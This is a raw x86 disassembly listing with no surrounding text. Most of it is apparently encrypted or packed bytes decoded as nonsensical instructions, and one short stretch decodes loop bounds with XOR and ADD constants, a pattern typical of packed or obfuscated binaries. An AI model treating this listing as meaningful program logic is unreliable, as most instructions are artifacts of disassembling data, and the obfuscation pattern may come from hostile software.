  41cca6:	aad    0xbc
  41cca8:	add    esp,eax
  41ccaa:	add    ebx,eax
  41ccac:	fdivr  QWORD PTR [eax-0x29291a0f]
  41ccb2:	jmp    0xf636c08d
  41ccb7:	jmp    esp
  41ccb9:	mov    dh,0xbc
  41ccbb:	fcomp  st(6)
  41ccbd:	shl    edi,cl
  41ccbf:	neg    esi
  41ccc1:	div    ecx
  41ccc3:	retf   0x7f6
  41ccc6:	test   edx,0xdcf8efca
  41cccc:	enter  0xe0c6,0xc5
  41ccd0:	out    dx,al
  41ccd1:	lods   al,BYTE PTR ds:[esi]
  41ccd2:	int    0xee
  41ccd4:	lock repz iret 
  41ccd7:	jmp    0xbc1986c4
  41ccdc:	hlt    
  41ccdd:	enter  0xffb8,0xc6
  41cce1:	repz loopne 0x41cca8
  41cce4:	cli    
  41cce5:	(bad)  
  41cce6:	jmp    0xebee:0xdff9de08
  41cced:	out    dx,al
  41ccee:	(bad)  
  41ccef:	fmul   st(2),st
  41ccf1:	mov    ah,0xcc
  41ccf3:	int    0xe4
  41ccf5:	mov    dh,0xf6
  41ccf7:	retf   0xdbe9
  41ccfa:	aam    0xdd
  41ccfc:	sar    BYTE PTR [ebp-0x3f180823],1
  41cd02:	idiv   dl
  41cd04:	hlt    
  41cd05:	cli    
  41cd06:	loopne 0x41cd0c
  41cd08:	pop    es
  41cd09:	jmp    esi
  41cd0b:	pop    es
  41cd0c:	out    0xcd,al
  41cd0e:	mov    bl,0xf6
  41cd10:	mov    bh,0xf6
  41cd12:	(bad)  
  41cd13:	rcl    dl,0xb5
  41cd16:	out    dx,eax
  41cd17:	hlt    
  41cd18:	fcomp  st(1)
  41cd1a:	aam    0xd7
  41cd1c:	add    ch,cl
  41cd1e:	lock (bad) 
  41cd20:	int3   
  41cd21:	in     eax,0xf6
  41cd23:	jecxz  0x41cd24
  41cd25:	jmp    0xe26b509
  41cd2a:	or     eax,0xf2eae2c9
  41cd2f:	mov    cl,0xb3
  41cd31:	int3   
  41cd32:	out    0xcb,al
  41cd34:	aam    0xda
  41cd36:	call   0xf314a330
  41cd3b:	into   
  41cd3c:	mov    bh,0xc8
  41cd3e:	in     eax,dx
  41cd3f:	(bad)  
  41cd41:	vshufps xmm0,xmm6,xmm4,0xd0
  41cd46:	div    ebp
  41cd48:	pop    es
  41cd49:	add    bl,ah
  41cd4b:	out    0xa8,eax
  41cd4d:	test   al,0xdc
  41cd4f:	xlat   BYTE PTR ds:[ebx]
  41cd50:	shl    bh,0xe9
  41cd53:	mov    ch,0xf8
  41cd55:	repnz mov cl,0xb8
  41cd58:	fdivr  QWORD PTR [edi-0x927474c]
  41cd5e:	fadd   st(0),st
  41cd60:	(bad)  
  41cd62:	aam    0xb
  41cd64:	icebp  
  41cd65:	dec    edx
  41cd67:	hlt    
  41cd68:	in     al,0xe1
  41cd6a:	leave  
  41cd6b:	cli    
  41cd6c:	rcl    ebx,cl
  41cd6e:	shr    BYTE PTR [esi+ebp*8-0x4c301d19],0xed
  41cd76:	jmp    0x41cd67
  41cd78:	iret   
  41cd79:	(bad)  
  41cd7a:	std    
  41cd7b:	jecxz  0x41cd49
  41cd7d:	(bad)  
  41cd7f:	in     eax,0xe4
  41cd81:	pop    es
  41cd82:	fldl2t 
  41cd84:	hlt    
  41cd85:	push   es
  41cd86:	fadd   DWORD PTR ds:0xeff9dd0c
  41cd8c:	leave  
  41cd8d:	call   0xe7efb572
  41cd92:	mov    dl,0xb3
  41cd94:	aam    0xfa
  41cd96:	not    eax
  41cd98:	fcmovne st,st(7)
  41cd9a:	lock hlt 
  41cd9c:	icebp  
  41cd9d:	mov    eax,0x3fdf4c3
  41cda2:	or     al,BYTE PTR [eax]
  41cda4:	(bad)  
  41cda5:	fprem1 
  41cda7:	or     cl,ch
  41cda9:	retf   
  41cdaa:	out    0xe1,eax
  41cdac:	retf   0xccbf
  41cdaf:	mov    bl,0xab
  41cdb1:	mov    bh,0xcc
  41cdb3:	lods   al,BYTE PTR ds:[esi]
  41cdb4:	jmp    0xfc07b36f
  41cdb9:	jmp    0xd83fa887
  41cdbe:	loop   0x41cdbc
  41cdc0:	rol    ecx,cl
  41cdc2:	out    0xf2,eax
  41cdc4:	or     cl,bh
  41cdc6:	jmp    0xd40bc9b9
  41cdcb:	call   0xe5ffb37f
  41cdd0:	les    esi,FWORD PTR [eax-0xa2a3a0e]
  41cdd6:	(bad)  
  41cdd7:	mov    edi,0xc8b1caf5
  41cddc:	clc    
  41cddd:	ret    
  41cdde:	jecxz  0x41cdc5
  41cde0:	(bad)  
  41cde2:	or     dl,ch
  41cde4:	fcmovb st,st(6)
  41cde6:	inc    BYTE PTR [edx]
  41cde8:	out    0xca,al
  41cdea:	fdivr  st,st(0)
  41cdec:	sar    BYTE PTR [esi-0x3f0d480e],0xad
  41cdf3:	icebp  
  41cdf4:	sti    
  41cdf5:	int3   
  41cdf6:	sar    DWORD PTR [edi-0x4200130],1
  41cdfc:	rol    DWORD PTR [ebx],1
  41cdfe:	aad    0xd5
  41ce00:	add    al,0xbd
  41ce02:	fnstsw WORD PTR [eax+ecx*1-0x321d27f8]
  41ce09:	(bad)  
  41ce0b:	in     eax,0xe5
  41ce0d:	retf   
  41ce0e:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce10:	jecxz  0x41cdfd
  41ce12:	rcl    esp,cl
  41ce14:	loopne 0x41cde1
  41ce16:	fcomip st,st(2)
  41ce18:	mov    esi,0xc3d4f8be
  41ce1d:	(bad)  
  41ce1e:	std    
  41ce1f:	mov    DWORD PTR [esp+eiz*8],0xff08c401
  41ce26:	xlat   BYTE PTR ds:[ebx]
  41ce27:	std    
  41ce28:	clc    
  41ce29:	ret    0xfde
  41ce2c:	fdivr  DWORD PTR [esp+ebx*8-0x1c164f49]
  41ce33:	mov    cl,0xd1
  41ce35:	aam    0xba
  41ce37:	lods   al,BYTE PTR ds:[esi]
  41ce38:	neg    bl
  41ce3a:	out    dx,al
  41ce3b:	(bad)  
  41ce3c:	mul    cl
  41ce3e:	cld    
  41ce3f:	out    dx,al
  41ce40:	aam    0x2
  41ce42:	cli    
  41ce43:	mul    ebp
  41ce45:	retf   0x50b
  41ce48:	in     al,dx
  41ce49:	(bad)  
  41ce4b:	fld    st(0)
  41ce4d:	stos   BYTE PTR es:[edi],al
  41ce4e:	shl    dl,1
  41ce50:	shl    edi,0xf7
  41ce53:	int3   
  41ce54:	int3   
  41ce55:	in     eax,0xe5
  41ce57:	div    bh
  41ce59:	sar    edi,cl
  41ce5b:	jecxz  0x41ce2f
  41ce5d:	add    bl,ah
  41ce5f:	fcomi  st,st(2)
  41ce61:	out    0xfd,eax
  41ce63:	or     ebp,eax
  41ce65:	fsubr  st,st(0)
  41ce67:	aam    0xfd
  41ce69:	push   es
  41ce6a:	sti    
  41ce6b:	jmp    0x41ce15
  41ce6d:	mov    dl,0xac
  41ce6f:	cmc    
  41ce70:	(bad)  
  41ce71:	repnz (bad) 
  41ce73:	fld    st(4)
  41ce75:	rol    edi,cl
  41ce77:	hlt    
  41ce78:	in     al,0xd6
  41ce7a:	idiv   DWORD PTR [edx+eiz*8-0x271c1c08]
  41ce81:	out    0xd8,eax
  41ce83:	jmp    0x606ac87
  41ce88:	retf   0xebe7
  41ce8b:	jmp    0xc9e1:0xa8ead8bf
  41ce92:	ror    dh,cl
  41ce94:	iret   
  41ce95:	sti    
  41ce96:	cli    
  41ce97:	sti    
  41ce98:	xlat   BYTE PTR ds:[ebx]
  41ce99:	mov    esp,0xbfecd2ec
  41ce9e:	add    ch,cl
  41cea0:	shl    edi,cl
  41cea2:	(bad)
  41cea5:	fprem1 
  41cea7:	shr    al,0x3
  41ceaa:	in     al,dx
  41ceab:	or     ebp,edi
  41cead:	xlat   BYTE PTR ds:[ebx]
  41ceae:	repz iret 
  41ceb0:	loop   0x41ce94
  41ceb2:	in     al,dx
  41ceb3:	jmp    0xfcc4:0xf7bbeed9
  41ceba:	fdivrp st(4),st
  41cebc:	loopne 0x41ceb4
  41cebe:	sar    ebp,0xda
  41cec1:	aad    0xbc
  41cec3:	retf   0xd7d7
  41cec6:	or     bl,bl
  41cec8:	(bad)  
  41cec9:	sti    
  41ceca:	ficom  DWORD PTR [ecx]
  41cecc:	in     al,dx
  41cecd:	call   0xef03ba7b
  41ced2:	mov    dl,0xdb
  41ced4:	mov    cl,0xc6
  41ced6:	mov    ch,0xe6
  41ced8:	sti    
  41ced9:	shl    dl,1
  41cedb:	mov    ebx,0xf3c7c802
  41cee0:	rol    al,1
  41cee2:	or     ah,dl
  41cee4:	or     edi,ebp
  41cee6:	(bad)  
  41cee8:	aam    0xe9
  41ceea:	clc    
  41ceeb:	out    0xbc,eax
  41ceed:	in     eax,dx
  41ceee:	in     eax,0xc5
  41cef0:	leave  
  41cef1:	mov    al,0xbb
  41cef3:	sar    cl,cl
  41cef5:	mov    bh,0xd0
  41cef7:	(bad)  
  41cef8:	mov    ebx,0xbdcad3b5
  41cefd:	in     al,dx
  41cefe:	out    0xcd,eax
  41cf00:	mov    ebp,0xe2dff10b
  41cf05:	(bad)  
  41cf06:	jmp    0x41cf05
  41cf08:	fild   WORD PTR [ecx]
  41cf0a:	add    eax,DWORD PTR [ecx]
  41cf0c:	out    dx,al
  41cf0d:	jecxz  0x41cee1
  41cf0f:	mov    ebp,0xecc5b2cb
  41cf14:	cmc    
  41cf15:	jmp    0x41cafe
  41cf1a:	enter  0xdae2,0xe2
  41cf1e:	stc    
  41cf1f:	cld    
  41cf20:	fcomi  st,st(7)
  41cf22:	(bad)  
  41cf24:	(bad)  
  41cf25:	sti    
  41cf26:	add    al,0xda
  41cf28:	(bad)  
  41cf29:	cld    
  41cf2a:	repnz add al,0xaa
  41cf2d:	out    dx,al
  41cf2e:	mov    al,0xd0
  41cf30:	(bad)  
  41cf31:	in     eax,0xfb
  41cf33:	(bad)  
  41cf35:	aad    0xff
  41cf37:	leave  
  41cf38:	into   
  41cf39:	imul   edi
  41cf3b:	loop   0x41cf11
  41cf3d:	test   edx,0x2fdf701
  41cf43:	loope  0x41cf15
  41cf45:	add    ebx,ebx
  41cf47:	or     ecx,DWORD PTR ds:0xdc11e9e4
  41cf4d:	mov    al,0xb2
  41cf4f:	mov    esi,0xeae5d0d5
  41cf54:	mov    edx,0xefccadd5
  41cf59:	cld    
  41cf5a:	(bad)  
  41cf5b:	leave  
  41cf5c:	(bad)  
  41cf5d:	ret    0x1f0
  41cf60:	mov    ebx,0xd1c7e6bc
  41cf65:	add    edx,ebp
  41cf67:	jecxz  0x41cf56
  41cf69:	fsubp  st(3),st
  41cf6b:	out    0xc3,eax
  41cf6d:	out    dx,eax
  41cf6e:	retf   0xabec
  41cf71:	(bad)
  41cf74:	mov    dl,0xae
  41cf76:	clc    
  41cf77:	fsubr  st,st(2)
  41cf79:	fyl2xp1 
  41cf7b:	iret   
  41cf7c:	fcomip st,st(3)
  41cf7e:	add    edi,esp
  41cf80:	(bad)  
  41cf81:	fsubr  st(4),st
  41cf83:	add    BYTE PTR [esi],al
  41cf85:	idiv   bh
  41cf87:	add    DWORD PTR [edx],ecx
  41cf89:	retf   0xdcc5
  41cf8c:	retf   
  41cf8d:	fsubr  DWORD PTR [ecx-0x2c2e0c17]
  41cf93:	(bad)  
  41cf94:	(bad)
  41cf97:	(bad)  
  41cf99:	mov    esp,0xf2feb4ba
  41cf9e:	into   
  41cf9f:	loope  0x41cf81
  41cfa1:	fucom  st(0)
  41cfa3:	add    bl,ch
  41cfa5:	add    ah,dh
  41cfa7:	add    al,0xd9
  41cfa9:	loopne 0x41cf96
  41cfab:	retf   0xdfc9
  41cfae:	repz mov dh,0xb3
  41cfb1:	not    cl
  41cfb3:	mov    cl,0xd5
  41cfb5:	mov    ebx,0xfec8f6c7
  41cfba:	test   dh,0xcd
  41cfbd:	clc    
  41cfbe:	add    edx,ecx
  41cfc0:	mov    esi,0x4fed1f4
  41cfc5:	or     BYTE PTR [eax],al
  41cfc7:	add    ecx,DWORD PTR [eax+eiz*8]
  41cfca:	call   0xd3eca1b7
  41cfcf:	mov    dl,0xab
  41cfd1:	repnz shl eax,cl
  41cfd4:	fidiv  DWORD PTR [esi-0x2b315326]
  41cfda:	shr    ah,cl
  41cfdc:	ret    0xd8d9
  41cfdf:	cmc    
  41cfe0:	icebp  
  41cfe1:	(bad)  
  41cfe3:	stc    
  41cfe4:	jecxz  0x41cfae
  41cfe6:	pxor   mm3,mm7
  41cfe9:	int3   
  41cfea:	push   cs
  41cfeb:	or     ah,ah
  41cfed:	repz test al,0xd3
  41cff0:	shr    ecx,cl
  41cff2:	out    dx,al
  41cff3:	into   
  41cff4:	into   
  41cff5:	mov    cl,0xe8
  41cff7:	mov    bh,0xcd
  41cff9:	mov    ch,0xe2
  41cffb:	leave  
  41cffc:	mov    bh,0xcf
  41cffe:	test   dl,0xe7
  41d001:	add    bh,ah
  41d003:	mov    esp,0xd5e0e9d8
  41d008:	cmc    
  41d009:	dec    DWORD PTR ds:0xf7a8e7ec
  41d00f:	out    0xf1,eax
  41d011:	repz shr BYTE PTR [esi+eiz*8-0x6160a28],cl
  41d019:	retf   0xdaf4
  41d01c:	repz sti 
  41d01e:	mov    ch,0xc2
  41d020:	fadd   st(5),st
  41d022:	fadd   QWORD PTR [ecx]
  41d024:	fdivp  st(4),st
  41d026:	fucompp 
  41d028:	enter  0xe60d,0xa
  41d02c:	fdiv   DWORD PTR [eax-0x3a09103f]
  41d032:	lods   al,BYTE PTR ds:[esi]
  41d033:	mov    bh,0xaf
  41d035:	into   
  41d036:	rcl    bl,cl
  41d038:	retf   0xefca
  41d03b:	mov    esi,0x7cfdeba
  41d040:	(bad)  
  41d041:	loopne 0x41d01a
  41d043:	cli    
  41d044:	jecxz  0x41d011
  41d046:	out    0xe4,eax
  41d048:	in     eax,0xe
  41d04a:	fnstsw ax
  41d04c:	mov    ebp,0xe8cdc1ed
  41d051:	stos   BYTE PTR es:[edi],al
  41d052:	ret    
  41d053:	int    0xea
  41d055:	out    dx,eax
  41d056:	(bad)  
  41d057:	mov    edi,0xf1eceabe
  41d05c:	in     al,dx
  41d05d:	in     al,dx
  41d05e:	fndisi(8087 only) 
  41d060:	out    0xc2,al
  41d062:	(bad)  
  41d063:	jecxz  0x41d036
  41d065:	fisttp WORD PTR [edi]
  41d067:	cli    
  41d068:	loope  0x41d037
  41d06a:	std    
  41d06b:	in     al,dx
  41d06c:	loope  0x41d038
  41d06e:	xlat   BYTE PTR ds:[ebx]
  41d06f:	shr    ebx,1
  41d071:	jecxz  0x41d06e
  41d073:	shl    DWORD PTR [ebx-0x2c28370d],cl
  41d079:	(bad)  
  41d07b:	mov    ecx,0xc00201d3
  41d080:	out    0xe6,al
  41d082:	add    esp,edi
  41d084:	fisttp DWORD PTR [ecx]
  41d086:	add    eax,0xcdc2fdca
  41d08b:	in     eax,0xe0
  41d08d:	xlat   BYTE PTR ds:[ebx]
  41d08e:	enter  0xd3c7,0xaa
  41d092:	in     al,dx
  41d093:	out    dx,eax
  41d094:	out    0xb7,eax
  41d096:	mov    dh,0xf5
  41d098:	dec    ebx
  41d09a:	mov    ecx,0xbff7f6fd
  41d09f:	cmc    
  41d0a0:	xlat   BYTE PTR ds:[ebx]
  41d0a1:	ror    DWORD PTR [edx],1
  41d0a3:	aam    0xea
  41d0a5:	loop   0x41d09d
  41d0a7:	fimul  DWORD PTR [ecx]
  41d0a9:	or     esp,edi
  41d0ab:	in     al,dx
  41d0ac:	loope  0x41d057
  41d0ae:	jmp    0xc0da:0xeee7efb3
  41d0b5:	jmp    0x41d089
  41d0b7:	iret   
  41d0b8:	iret   
  41d0b9:	repz mov ebx,0xd4e2ec01
  41d0bf:	fdiv   st(1),st
  41d0c1:	sar    edi,0xc1
  41d0c4:	in     al,0xf8
  41d0c6:	std    
  41d0c7:	cli    
  41d0c8:	call   0xe62ae4ba
  41d0cd:	loop   0x41d086
  41d0cf:	mov    bh,0xae
  41d0d1:	jecxz  0x41d085
  41d0d3:	out    dx,al
  41d0d4:	into   
  41d0d5:	rcl    dl,0xb8
  41d0d8:	fcomp  st(1)
  41d0da:	idiv   cl
  41d0dc:	stc    
  41d0dd:	repz mov esp,0xf3c4e4e1
  41d0e3:	(bad)
  41d0e6:	or     BYTE PTR [edi],al
  41d0e8:	loop   0x41d0c8
  41d0ea:	call   0xe22796b3
  41d0ef:	mov    eax,0xb4f4d1d3
  41d0f5:	shl    dl,cl
  41d0f7:	iret   
  41d0f8:	leave  
  41d0f9:	in     al,0xca
  41d0fb:	into   
  41d0fc:	out    dx,eax
  41d0fd:	int    0x0
  41d0ff:	idiv   BYTE PTR [esi-0x2a1d1e30]
  41d105:	jmp    0xc723c700
  41d10a:	or     al,0xcd
  41d10c:	stos   BYTE PTR es:[edi],al
  41d10d:	out    0xbf,eax
  41d10f:	out    dx,al
  41d110:	aad    0xd2
  41d112:	(bad)
  41d115:	in     eax,0xc5
  41d117:	mov    edx,0xddece9ed
  41d11c:	mov    esi,0xf3d806c0
  41d121:	cli    
  41d122:	or     eax,DWORD PTR [esi]
  41d124:	add    bl,ah
  41d126:	add    ch,bh
  41d128:	or     al,0xe1
  41d12a:	ror    esi,0xcb
  41d12d:	iret   
  41d12e:	shr    edi,cl
  41d130:	lods   al,BYTE PTR ds:[esi]
  41d131:	les    esi,FWORD PTR [ebx-0x160a081a]
  41d137:	(bad)  
  41d138:	(bad)
  41d13b:	mov    edx,0xc6ee0303
  41d140:	fadd   st,st(3)
  41d142:	hlt    
  41d143:	repnz cld 
  41d145:	enter  0xe1f5,0x5
  41d149:	or     al,0x9
  41d14b:	int3   
  41d14c:	fadd   st(7),st
  41d14e:	out    dx,eax
  41d14f:	ret    
  41d150:	shl    bl,1
  41d152:	leave  
  41d153:	xlat   BYTE PTR ds:[ebx]
  41d154:	shr    dl,1
  41d156:	shl    bl,cl
  41d158:	fxch   st(7)
  41d15a:	loop   0x41d134
  41d15c:	(bad)  
  41d15e:	fcmovnu st,st(6)
  41d160:	(bad)  
  41d161:	mov    esp,0xa03fdbd
  41d166:	call   0x720b72b
  41d16b:	call   0xd8218f61
  41d170:	mov    bl,0xc0
  41d172:	(bad)
  41d176:	icebp  
  41d177:	jmp    0xb931cf5a
  41d17c:	sti    
  41d17d:	aam    0xd7
  41d17f:	ret    
  41d180:	push   es
  41d181:	rol    edx,0xc5
  41d184:	rol    BYTE PTR [eax],0xe7
  41d187:	or     bl,ch
  41d189:	in     eax,0xdb
  41d18b:	pop    es
  41d18c:	leave  
  41d18d:	stos   BYTE PTR es:[edi],al
  41d18e:	icebp  
  41d18f:	vpsubsw xmm0,xmm5,xmm4
  41d193:	lods   al,BYTE PTR ds:[esi]
  41d194:	out    0xf5,eax
  41d196:	mov    dh,0xeb
  41d198:	aam    0xba
  41d19a:	add    dh,ah
  41d19c:	mov    esi,0xc3f9d7f0
  41d1a1:	sar    bh,0x2
  41d1a4:	icebp  
  41d1a5:	add    al,0xb
  41d1a7:	add    dl,ah
  41d1a9:	or     ch,bl
  41d1ab:	leave  
  41d1ac:	jmp    0xbd34b094
  41d1b1:	out    0xe1,eax
  41d1b3:	mov    bh,0xd9
  41d1b5:	cli    
  41d1b6:	(bad)  
  41d1b7:	mov    ebx,0xe3eadcd0
  41d1bc:	loope  0x41d190
  41d1be:	mov    esi,0xf0d7ecdc
  41d1c3:	aad    0xb
  41d1c5:	vpaddw ymm7,ymm5,ymm0
  41d1c9:	(bad)  
  41d1ca:	push   cs
  41d1cb:	pop    es
  41d1cc:	mov    eax,0xd7adf2af
  41d1d1:	jecxz  0x41d1bb
  41d1d3:	retf   
  41d1d4:	scas   eax,DWORD PTR es:[edi]
  41d1d5:	retf   0xcdcd
  41d1d8:	(bad)  
  41d1da:	hlt    
  41d1db:	hlt    
  41d1dc:	fstp   st(5)
  41d1de:	inc    DWORD PTR ds:0x7dadbdd
  41d1e4:	fadd   DWORD PTR [edx]
  41d1e6:	out    dx,eax
  41d1e7:	or     DWORD PTR [edx+edi*8],ecx
  41d1ea:	add    eax,0xf0d2cadc
  41d1ef:	enter  0xb4dd,0xcd
  41d1f3:	hlt    
  41d1f4:	shr    ecx,1
  41d1f6:	fdecstp 
  41d1f8:	mov    ecx,0xd5e2d8bc
  41d1fd:	sar    BYTE PTR [esi-0x82b431f],cl
  41d203:	rcr    ecx,1
  41d205:	loopne 0x41d20c
  41d207:	leave  
  41d208:	or     ah,bl
  41d20a:	repnz in al,dx
  41d20c:	int    0xc8
  41d20e:	int3   
  41d20f:	retf   
  41d210:	enter  0xc1c7,0xda
  41d214:	shl    BYTE PTR [edi-0x414c1708],cl
  41d21a:	mov    ebp,0xfcded6fd
  41d21f:	mov    esp,0x1dbbc
  41d224:	in     eax,0xef
  41d226:	rol    dh,0x0
  41d229:	fcmove st,st(3)
  41d22b:	fcomip st,st(2)
  41d22d:	fucomp st(2)
  41d22f:	mov    al,0xc2
  41d231:	repz test al,0xce
  41d235:	int3   
  41d236:	lods   eax,DWORD PTR ds:[esi]
  41d237:	int3   
  41d238:	mov    bl,0xfe
  41d23a:	mov    ebx,0xd9f2f0be
  41d23f:	push   edi
  41d241:	(bad)  
  41d242:	in     eax,0xb8
  41d244:	mov    edi,0xe4d9eff0
  41d249:	sti    
  41d24a:	int3   
  41d24b:	cld    
  41d24c:	jmp    0x41d1fc
  41d24e:	jmp    0xf7c0:0xf4b5ecce
  41d255:	(bad)  
  41d257:	in     eax,0xf8
  41d259:	jmp    0x41d234
  41d25b:	mov    edi,0xb4bdbddb
  41d260:	mul    ah
  41d262:	add    al,BYTE PTR [ecx]
  41d264:	(bad)  
  41d265:	fcmovnb st,st(6)
  41d267:	retf   0xddda
  41d26a:	leave  
  41d26b:	loope  0x41d249
  41d26d:	fdiv   QWORD PTR [ebx-0xe51354a]
  41d273:	lock cli 
  41d275:	jmp    0xf4f0:0xfeb9d0e7
  41d27c:	cld    
  41d27d:	rol    DWORD PTR [edx],1
  41d27f:	fcmovb st,st(0)
  41d281:	shl    ecx,0xe4
  41d284:	loop   0x41d256
  41d286:	hlt    
  41d287:	stc    
  41d288:	lds    eax,FWORD PTR [eax]
  41d28a:	(bad)  
  41d28b:	cld    
  41d28c:	jmp    0xf1f2:0xe6d7ded7
  41d293:	div    bh
  41d295:	mul    ebp
  41d297:	out    dx,eax
  41d298:	mov    ah,0xf0
  41d29a:	div    BYTE PTR [eax-0x92d3002]
  41d2a0:	ffree  st(4)
  41d2a2:	jmp    0x5da:0x6d4cbf0
  41d2a9:	out    dx,eax
  41d2aa:	(bad)  
  41d2ab:	jmp    0xcac0:0xaeace0c3
  41d2b2:	rcr    cl,1
  41d2b4:	icebp  
  41d2b5:	lds    edi,FWORD PTR [edi-0x320012e]
  41d2bb:	ret    
  41d2bc:	mov    bh,0xe3
  41d2be:	(bad)  
  41d2bf:	mov    eax,0xf8bdf4d9
  41d2c4:	jecxz  0x41d2c8
  41d2c6:	psubb  mm7,mm7
  41d2c9:	repz or edi,ecx
  41d2cc:	mov    cl,0xe2
  41d2ce:	shl    edx,0xdd
  41d2d1:	loopne 0x41d293
  41d2d3:	div    BYTE PTR [ebx+ecx*8-0x34323710]
  41d2da:	ret    
  41d2db:	mov    al,0xf8
  41d2dd:	mov    esi,0x5e5cddb
  41d2e2:	ror    DWORD PTR [ebx],0xfb
  41d2e5:	aam    0xe5
  41d2e7:	(bad)  
  41d2e9:	add    esi,ecx
  41d2eb:	fsubr  DWORD PTR [ebx-0x224f323c]
  41d2f1:	mov    ah,0xcf
  41d2f3:	test   al,0xeb
  41d2f5:	scas   al,BYTE PTR es:[edi]
  41d2f6:	(bad)  
  41d2f7:	mov    edi,0xefd0daf4
  41d2fc:	push   edx
  41d2fe:	lock out 0x0,eax
  41d301:	mov    edx,0xdbf0c3f5
  41d306:	fndisi(8087 only) 
  41d308:	aad    0xe0
  41d30a:	loope  0x41d31a
  41d30c:	jmp    0x41d300
  41d30e:	fistp  QWORD PTR [esi-0x2b161e2c]
  41d314:	mov    ecx,0xbaf1e6c0
  41d319:	(bad)  
  41d31b:	cld    
  41d31c:	add    eax,ecx
  41d31e:	iret   
  41d31f:	fsubr  st(0),st
  41d321:	clc    
  41d322:	(bad)  
  41d323:	(bad)  
  41d324:	std    
  41d325:	out    0xe2,eax
  41d327:	in     eax,dx
  41d328:	leave  
  41d329:	in     al,0x8
  41d32b:	loopne 0x41d2d8
  41d32d:	jmp    0xc90ac00f
  41d332:	loope  0x41d2f6
  41d334:	mov    ch,0xe4
  41d336:	enter  0xe5b0,0xf1
  41d33a:	jecxz  0x41d31a
  41d33c:	loope  0x41d321
  41d33e:	loopne 0x41d335
  41d340:	in     al,0xc4
  41d342:	push   es
  41d343:	inc    ebp
  41d345:	or     esi,edx
  41d347:	cld    
  41d348:	clc    
  41d349:	push   cs
  41d34a:	pop    es
  41d34b:	fnstsw WORD PTR [ecx-0x32523635]
  41d351:	hlt    
  41d352:	rcr    cl,0xee
  41d355:	mov    ah,0xc6
  41d357:	retf   
  41d358:	aad    0xed
  41d35a:	retf   0xf8e2
  41d35d:	fcomi  st,st(5)
  41d35f:	mov    esp,0xebc5bcc3
  41d364:	(bad)  
  41d365:	(bad)  
  41d367:	(bad)  
  41d368:	or     ebp,ecx
  41d36a:	in     eax,dx
  41d36b:	retf   0xb3aa
  41d36e:	(bad)
  41d371:	shl    DWORD PTR [edi+eax*8-0x45293749],cl
  41d378:	mov    ebx,0xe3f1f7c9
  41d37d:	mov    ecx,0xf5e4fbe7
  41d382:	cld    
  41d383:	(bad)  
  41d384:	lock in eax,0xd8
  41d387:	or     cl,BYTE PTR [ecx]
  41d389:	(bad)  
  41d38b:	out    dx,al
  41d38c:	jmp    0x41d340
  41d38e:	repnz iret 
  41d390:	repz scas al,BYTE PTR es:[edi]
  41d392:	int    0xee
  41d394:	retf   0xc5d3
  41d397:	sti    
  41d398:	(bad)  
  41d399:	jmp    0xccec:0xd1d0cdb5
  41d3a0:	std    
  41d3a1:	fdivrp st(5),st
  41d3a3:	in     al,0xe5
  41d3a5:	add    ecx,DWORD PTR [ecx]
  41d3a7:	fisttp QWORD PTR [ecx]
  41d3a9:	sti    
  41d3aa:	repz icebp 
  41d3ac:	(bad)  
  41d3ae:	shl    dl,cl
  41d3b0:	mov    bh,0xe4
  41d3b2:	into   
  41d3b3:	repnz mov ah,0xb1
  41d3b6:	rcl    eax,1
  41d3b8:	mov    edx,0xe2e2db
  41d3bd:	(bad)  
  41d3be:	cmc    
  41d3bf:	loopne 0x41d3c3
  41d3c1:	mov    esp,0xd4ebc1e0
  41d3c6:	jmp    0xa7fa:0xcf010dc8
  41d3cd:	(bad)  
  41d3cf:	mov    al,0xd0
  41d3d2:	(bad)  
  41d3d3:	out    dx,eax
  41d3d4:	in     al,dx
  41d3d5:	rcl    bh,0xbb
  41d3d8:	xlat   BYTE PTR ds:[ebx]
  41d3d9:	out    dx,eax
  41d3da:	icebp  
  41d3db:	cli    
  41d3dc:	mov    edi,0x81dfc7d2
  41d3e1:	sar    ebx,0x72
  41d3e4:	xor    al,BYTE PTR [eax]
  41d3e6:	sub    eax,ecx
  41d3e8:	cmp    edx,eax
  41d3ea:	jne    0x421c8b
  41d3f0:	mov    eax,DWORD PTR [ebp-0x8]
  41d3f3:	add    eax,DWORD PTR [ebp-0x10c]
  41d3f9:	mov    al,BYTE PTR [eax]
  41d3fb:	mov    BYTE PTR [ebp-0x131],al
  41d401:	mov    eax,DWORD PTR [ebp-0x118]
  41d407:	xor    eax,0x75108b5
  41d40c:	add    eax,0x3272fb
  41d411:	mov    DWORD PTR [ebp-0x138],eax
  41d417:	jmp    0x41d429
  41d41c:	mov    eax,DWORD PTR [ebp-0x138]
  41d422:	inc    eax
  41d423:	mov    DWORD PTR [ebp-0x138],eax
  41d429:	mov    eax,DWORD PTR [ebp-0x114]
  41d42f:	xor    eax,0x75108b5
  41d434:	add    eax,0x3272fb
  41d439:	cmp    DWORD PTR [ebp-0x138],eax
  41d43f:	jmp    0x41f7e5
  41d444:	xor    BYTE PTR [eax-0xf141525],0x90
  41d44b:	lock inc ecx
  41d44d:	cs push 0xad01eff3
  41d453:	mov    ds:0x7b7aff4f,al
  41d458:	add    bl,BYTE PTR [eax-0x1a2d8485]
  41d45e:	clc    
  41d45f:	add    eax,0xc9e9c8fb
  41d464:	or     al,0xe1
  41d466:	int    0xdd
  41d468:	shl    al,0xd6
  41d46b:	test   al,0xcb
  41d46d:	mov    bh,0xe1
  41d46f:	call   0xad06cd39
  41d474:	hlt    
  41d475:	clc    
  41d476:	fild   DWORD PTR [ebx]
  41d478:	hlt    
  41d479:	aad    0xb5
  41d47b:	out    0xbf,eax
  41d47d:	aam    0xe1
  41d47f:	ret    0x3e3
  41d482:	prefetch (bad)
  41d483:	or     eax,0xc4e804ef
  41d488:	test   eax,0xabf3eac1
  41d48d:	loopne 0x41d443
  41d48f:	xlat   BYTE PTR ds:[ebx]
  41d490:	(bad)  
  41d491:	ror    bl,1
  41d493:	hlt    
  41d494:	fcomp  st(5)
  41d496:	clc    
  41d497:	fmulp  st(6),st
  41d499:	mov    dh,0xbf
  41d49b:	mov    DWORD PTR [edi],0xd6c1f4f6
  41d4a1:	retf   0xe9c1
  41d4a4:	loopne 0x41d492
  41d4a6:	(bad)  
  41d4a8:	out    dx,eax
  41d4a9:	rcl    bh,cl
  41d4ab:	ret    0xb1ee
  41d4ae:	mov    ah,0xe5
  41d4b0:	mov    al,0xd4
  41d4b2:	neg    al
  41d4b4:	fcomi  st,st(2)
  41d4b6:	lock retf 0xf3ec
  41d4ba:	loopne 0x41d4b2
  41d4bc:	cld    
  41d4bd:	lock mov ecx,0xd5efd603
  41d4c3:	jmp    esp
